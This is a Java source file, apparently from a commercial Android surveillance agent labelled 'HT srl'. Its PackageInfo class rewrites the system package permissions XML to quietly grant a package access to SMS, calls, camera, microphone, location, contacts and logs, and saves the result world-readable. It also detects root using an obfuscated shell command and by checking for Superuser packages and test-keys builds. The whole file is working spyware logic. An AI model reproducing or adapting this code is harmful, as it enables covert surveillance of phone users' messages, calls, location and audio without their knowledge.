/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 27-jun-2011
 **********************************************/

package com.android.service.capabilities;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;

import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

import org.xml.sax.SAXException;

import android.content.Context;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.file.AutoFile;
import com.android.service.util.Check;
import com.android.service.util.Execute;

public class PackageInfo {
	private static final String TAG = "PackageInfo";

	private String packageName;
	private FileInputStream fin;
	private XmlParser xml;

	private String requiredPerms[] = { "android.permission.READ_LOGS", "android.permission.READ_SMS",
			"android.permission.SET_WALLPAPER", "android.permission.SEND_SMS",
			"android.permission.PROCESS_OUTGOING_CALLS", "android.permission.WRITE_APN_SETTINGS",
			"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.WRITE_SMS",
			"android.permission.ACCESS_WIFI_STATE", "android.permission.ACCESS_COARSE_LOCATION",
			"android.permission.RECEIVE_SMS", "android.permission.READ_CONTACTS", "android.permission.CALL_PHONE",
			"android.permission.READ_PHONE_STATE", "android.permission.RECEIVE_BOOT_COMPLETED",
			"android.permission.CAMERA", "android.permission.INTERNET", "android.permission.CHANGE_WIFI_STATE",
			"android.permission.ACCESS_FINE_LOCATION", "android.permission.VIBRATE", "android.permission.WAKE_LOCK",
			"android.permission.RECORD_AUDIO", "android.permission.ACCESS_NETWORK_STATE",
			"android.permission.FLASHLIGHT"
	// "android.permission.REBOOT"
	};

	// XML da parsare
	public PackageInfo(FileInputStream fin, String packageName) throws SAXException, IOException,
			ParserConfigurationException, FactoryConfigurationError {
		this.fin = fin;
		this.packageName = packageName;

		this.xml = new XmlParser(this.fin);
	}

	public String getPackagePath() {
		return this.xml.getPackagePath(this.packageName);
	}

	private ArrayList<String> getPackagePermissions() {
		return this.xml.getPackagePermissions(this.packageName);
	}

	public boolean addRequiredPermissions(String outName) {
		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
			return false;
		}

		serialize(outName);

		return true;
	}

	private void serialize(String fileName) {
		FileOutputStream fos;

		try {
			fos = Status.getAppContext().openFileOutput(fileName, Context.MODE_WORLD_READABLE);

			String xmlOut = xml.serializeXml();
			fos.write(xmlOut.getBytes());
			fos.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " (serialize): Exception during file creation"); //$NON-NLS-1$
			}
		}
	}

	public boolean checkRequiredPermission() {
		boolean permFound = false;
		ArrayList<String> a = getPackagePermissions();

		for (int i = 0; i < this.requiredPerms.length; i++) {
			for (String actualPerms : a) {
				permFound = false;

				if (actualPerms.equals(this.requiredPerms[i]) == true) {
					permFound = true;
					break;
				}
			}

			if (permFound == false) {
				break;
			}
		}

		return permFound;
	}

	static public boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		try {
			// Verifichiamo di essere root
			final AutoFile file = new AutoFile(Configuration.shellFile);

			if (file.exists() && file.canRead()) {
				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
				p.waitFor();

				if (p.exitValue() == 1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
					}

					isRoot = true;
				}
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(e);//$NON-NLS-1$
			}
		}

		return isRoot;
	}
	
	static public boolean hasSu() {
		if (checkDebugBuild() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
			}
			
			return true;
		}
		
		if (checkRootPackages() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkRootPackages true"); //$NON-NLS-1$
			}
			
			return true;
		}
		
		
		return false;
	}

	// Non dovrebbe servire usarla
	private static boolean checkSuBinary() {
		Execute exec = new Execute();
		ArrayList<String> output = exec.execute("ls -l");
		Iterator<String> i = output.iterator();

		if (i == null) {
			return false;
		}
		
		while (i.hasNext()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkSuBinary): " + i.next()); //$NON-NLS-1$
			}
		}

		return false;
	}

	private static boolean checkRootPackages() {
		try {
            File file = new File("/system/app/Superuser.apk");
            
            if (file.exists()) {
                return true;
            }
            
            file = new File("/data/app/com.noshufou.android.su-1.apk");

            if (file.exists()) {
                return true;
            }
		} catch (Exception e) { 
        	if (Cfg.EXP) {
        		Check.log(e);
        	}
        }

        return false;
	}

	private static boolean checkDebugBuild() {
		String buildTags = android.os.Build.TAGS;

        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }
        
        return false;
	}
}
